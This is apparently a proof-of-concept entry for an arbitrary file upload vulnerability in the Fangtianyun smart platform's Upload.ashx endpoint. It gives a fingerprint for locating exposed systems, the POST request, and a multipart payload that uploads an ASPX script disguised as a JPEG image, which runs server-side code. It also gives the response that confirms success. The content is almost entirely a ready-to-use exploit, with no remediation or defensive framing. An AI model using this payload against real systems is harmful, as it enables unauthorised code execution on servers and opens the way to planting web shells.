# 方天云智慧平台系统Upload.ashx任意文件上传漏洞

方天云智慧平台系统Upload.ashx ｜ 文件上传 ｜ —
- **指纹**：`body="AjaxMethods.asmx/GetCompanyItem"`
- **请求**：`POST /Upload.ashx HTTP/1.1`

**Payload**
```
------WebKitFormBoundarySl8siBbmVicABvTX
Content-Disposition: form-data; name="file"; filename="qwe.aspx"
Content-Type: image/jpeg
<%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
------WebKitFormBoundarySl8siBbmVicABvTX--
```
- **响应特征**：200 回显上传路径xxx/xxx/xxx.aspx